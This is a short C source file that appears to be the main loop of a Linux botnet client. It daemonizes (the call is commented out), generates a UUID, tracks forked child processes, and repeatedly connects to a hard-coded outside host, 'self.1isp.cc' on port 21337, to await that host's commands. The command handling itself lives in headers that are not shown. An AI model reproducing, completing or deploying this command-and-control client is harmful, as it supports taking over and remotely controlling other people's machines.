/*
   created at 2015//4/9
   latest modified at 2015/4/9
   test server used by alexjlz
 */

#include "tcpip/tcpip.h"
#include "utils/utils.h"
#include "core/core.h"
#include "alg/alexjlz_hash.h"
#include "daemon/daemon.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int mainCommSock = 0;
char *server = "self.1isp.cc";
int port = 21337;
uint32_t *pids;
uint64_t numpids = 0;
extern char uuid[32];

int listFork()
{
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}

int main(int argc, char **argv)
{
    generate_uuid();

    //daemonize();
    while ( 1 )
    {
		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
        { 
            printf("Failed to connect...\n"); sleep(5); continue; 
        }
        if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
                                                      // and server are unexpectedly closed
        {
            fprintf(stdout, "error in client\n");
        }
        
        if ( check_fd(mainCommSock) )
        {
            close(mainCommSock);
        }
        sleep(3);
    }

    return 0;
}
